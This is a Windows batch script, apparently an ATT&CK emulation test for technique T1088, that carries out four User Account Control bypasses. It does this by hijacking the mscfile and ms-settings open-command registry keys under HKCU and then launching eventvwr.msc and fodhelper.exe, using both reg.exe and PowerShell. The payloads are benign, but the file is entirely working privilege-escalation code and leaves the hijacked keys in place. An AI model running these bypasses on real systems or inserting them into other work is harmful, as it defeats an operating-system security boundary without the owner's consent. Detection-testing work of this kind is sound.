@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Bypass User Account Control (T1088)
ECHO.
ECHO [+] Bypass UAC using Event Viewer
ECHO -------------------------------------------------------------------
reg add HKCU\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe /c ping 127.0.0.1 -n 2 > nul" /f
cmd.exe /c eventvwr.msc
ECHO.

ECHO.
ECHO [+] Bypass UAC via Event Viewer PowerShell
ECHO -------------------------------------------------------------------
PowerShell New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
PowerShell Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "Mitre01" -Value "C:\Windows\System32\cmd.exe" -Force 
PowerShell Start-Process "C:\Windows\System32\eventvwr.msc"
ECHO.

ECHO.
ECHO [+] Bypass UAC using Fodhelper
ECHO -------------------------------------------------------------------
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
fodhelper.exe
ECHO.


ECHO [+] Bypass UAC using Fodhelper - PowerShell
ECHO -------------------------------------------------------------------
PowerShell New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
PowerShell New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "C:\Windows\System32\cmd.exe" -Force
PowerShell Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "Mitre02" -Value "C:\Windows\System32\cmd.exe" -Force
PowerShell Start-Process "C:\Windows\System32\fodhelper.exe"
ECHO.

